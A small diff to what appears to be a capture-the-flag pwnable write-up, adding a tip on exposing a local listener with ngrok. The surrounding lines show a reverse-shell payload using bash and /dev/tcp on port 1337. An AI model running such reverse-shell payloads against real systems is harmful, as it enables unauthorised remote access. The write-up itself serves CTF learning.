@@ -914,6 +914,8 @@ Listening on 0.0.0.0 1337
 system('bash -c \'exec bash -i &>/dev/tcp/0/1337 <&1\'')
 ```
 
+To get shell on the server, just use `ngrok tcp 1337`. This command will generate a public URL, and any traffic to that URL will be forwarded to your local machine's port 1337.
+
 Result:
 ```c
 ╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
